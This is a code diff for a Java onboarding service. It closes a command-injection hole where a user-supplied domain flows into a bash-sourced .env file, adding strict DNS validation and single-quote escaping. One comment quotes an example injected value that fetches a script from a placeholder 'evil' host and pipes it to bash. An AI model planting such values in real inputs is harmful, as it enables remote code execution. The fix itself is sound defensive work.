@@ -591,9 +591,23 @@ public class OnboardingService {
   /** Update .state.yml + packages/core/.env's DOMAIN. */
   public void setDomain(String domain) {
     if (domain == null || domain.isBlank()) throw new IllegalArgumentException("domain required");
-    stateFiles.writeDomain(domain.trim());
-    upsertCoreEnvDomain(domain.trim());
-    audit.record(null, "onboarding.domain.set", "domain:" + domain, null);
+    String normalized = domain.trim().toLowerCase();
+    if (!DOMAIN_PATTERN.matcher(normalized).matches()) {
+      // Security-review B-1 (2026-08-02, HIGH): the domain string flows
+      // through OnboardingService → upsertCoreEnvDomain → packages/core/.env
+      // → scripts/up.sh which sources it with `. "$ef"`. That's bash eval:
+      // an unvalidated value like `foo$(curl http://evil|bash)` would run.
+      // We defend in three layers:
+      //   (a) here — strict shape (RFC 1123-ish, 2+ labels, ≤ 253 chars)
+      //   (b) quote-escape at .env write (see upsertCoreEnvDomain)
+      //   (c) up.sh switching to `docker compose --env-file` (v0.2 backlog)
+      // Rejecting the request with 400 is honest and cheap.
+      throw new IllegalArgumentException(
+          "domain must be a valid DNS name (letters, digits, hyphens, at least one dot)");
+    }
+    stateFiles.writeDomain(normalized);
+    upsertCoreEnvDomain(normalized);
+    audit.record(null, "onboarding.domain.set", "domain:" + normalized, null);
     // Advance the server-side step cursor forward but never backward.
     if (rank(currentStep()) < rank("packages")) settings.put(KEY_STEP, "packages");
   }
@@ -616,6 +630,21 @@ public class OnboardingService {
 
   private static final Pattern DOMAIN_LINE = Pattern.compile("^\\s*DOMAIN\\s*=.*$");
 
+  /**
+   * Strict RFC 1123-ish DNS label validation. Two or more labels required
+   * (so bare hostnames like {@code aurora} are rejected), each label 1–63
+   * chars from {@code [a-z0-9-]} not starting or ending with a hyphen, total
+   * length ≤ 253. Deliberately narrower than RFC 1123 (no leading digits
+   * in labels) to make the character class small enough that anything the
+   * bash source of {@code packages/core/.env} could execute is impossible.
+   *
+   * <p>Any change here — especially widening the character class — must
+   * re-audit {@link #upsertCoreEnvDomain} single-quote escaping and the
+   * eventual {@code up.sh} env-file parser.
+   */
+  static final Pattern DOMAIN_PATTERN = Pattern.compile(
+      "^(?=.{1,253}$)([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)(\\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$");
+
   private void upsertCoreEnvDomain(String domain) {
     Path env = Path.of(props.repoPath()).resolve("packages/core/.env");
     try {
@@ -626,12 +655,12 @@ public class OnboardingService {
       for (int i = 0; i < lines.size(); i++) {
         Matcher m = DOMAIN_LINE.matcher(lines.get(i));
         if (m.matches()) {
-          lines.set(i, "DOMAIN=" + domain);
+          lines.set(i, "DOMAIN=" + quoteForBash(domain));
           replaced = true;
           break;
         }
       }
-      if (!replaced) lines.add("DOMAIN=" + domain);
+      if (!replaced) lines.add("DOMAIN=" + quoteForBash(domain));
       String body = String.join("\n", lines) + "\n";
       Files.createDirectories(env.getParent());
       Files.writeString(env, body, StandardCharsets.UTF_8,
@@ -644,6 +673,20 @@ public class OnboardingService {
     } catch (IOException e) {
       throw new RuntimeException("failed to write " + env, e);
     }
+  }
+
+  /**
+   * Single-quote-escape a value for safe sourcing by bash ({@code . "$ef"}
+   * in {@code scripts/up.sh}). Bash single-quoting suppresses variable and
+   * command substitution; the only character that ends a single-quoted
+   * string is another single-quote, which we escape by closing, injecting a
+   * literal single-quote, and reopening: {@code '\''}. Combined with the
+   * strict {@link #DOMAIN_PATTERN} shape check this is defense-in-depth
+   * belt-and-braces — valid domains contain no single quotes so this is a
+   * no-op today, but hardens future writers that may loosen the regex.
+   */
+  static String quoteForBash(String value) {
+    return "'" + value.replace("'", "'\\''") + "'";
   }
 
   private static String toJsonArray(List<String> xs) {
